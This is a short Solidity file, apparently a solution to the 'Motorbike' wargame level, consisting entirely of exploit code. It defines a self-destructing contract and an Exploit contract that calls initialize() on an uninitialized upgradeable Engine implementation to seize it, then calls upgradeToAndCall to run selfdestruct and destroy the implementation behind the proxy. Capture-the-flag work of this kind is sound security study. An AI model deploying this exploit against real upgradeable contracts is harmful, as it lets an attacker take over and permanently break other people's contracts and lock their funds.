// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "exploit_templates/0.6/Destructible.sol";
import "exploit_templates/0.6/Targeted.sol";
import "motorbike/contract.sol";

contract ImplodingEngine {
    function blowup() public {
        selfdestruct(payable(msg.sender));
    }
}

contract Exploit is Destructible, Targeted {
  Motorbike bike;
  Engine engine;
  ImplodingEngine implodingEngine;
  constructor(address payable target_addr, address engine_addr) payable Targeted(target_addr) public {
    bike = Motorbike(target_addr);
    engine = Engine(engine_addr);
    implodingEngine = new ImplodingEngine();
  }
  function exploit() public payable {
    engine.initialize();
    engine.upgradeToAndCall(address(implodingEngine), abi.encodeWithSignature("blowup()"));
  }
  receive() external payable {
  }
}